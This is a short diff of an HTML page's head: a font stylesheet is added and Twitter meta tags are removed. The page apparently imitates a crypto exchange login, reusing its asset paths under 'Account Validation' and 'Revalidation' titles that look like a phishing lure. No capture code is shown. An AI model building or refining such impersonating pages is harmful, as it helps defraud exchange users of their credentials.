@@ -155,6 +155,7 @@
   <link rel="preload" href="assets.staticimg.com/natasha/npm/%40kux/font/KFOlCnqEu92Fr1MmWUlfBBc4AMP6lQ.woff2" as="font" type="font/woff2" crossorigin="">
   <link rel="stylesheet" href="assets.staticimg.com/natasha/npm/%40kufox/mui%402.5.14/umd/kufox-mui.umd.min.css">
   <noscript>
+    <link rel="stylesheet" href="assets.staticimg.com/natasha/npm/%40kux/font/css.css">
   </noscript>
   <title>Account Validation: Sign Login</title>
   <link href="assets.staticimg.com/natasha/npm/anomaly/style.css" rel="prefetch" as="style" crossorigin="">
@@ -199,9 +200,7 @@
   <meta property="og:title" content="Account: Revalidation">
   <meta name="twitter:title" content="Account: Revalidation">
   <meta property="og:image:alt" content="Account: Revalidation">
-  <meta property="twitter:image:alt" content="Account: Revalidation">
   <meta property="og:description" content="Account Validation, and get your first crypto today!">
-  <meta name="twitter:description" content="Account Validation, and get your first crypto today!">
   <style id="ssg-jss-node" ssg-jss-node="1" type="text/css">
     .css-76ygvu .gbiz-headeroom {
       border-bottom: 1px solid rgba(29, 29, 29, 0.08);
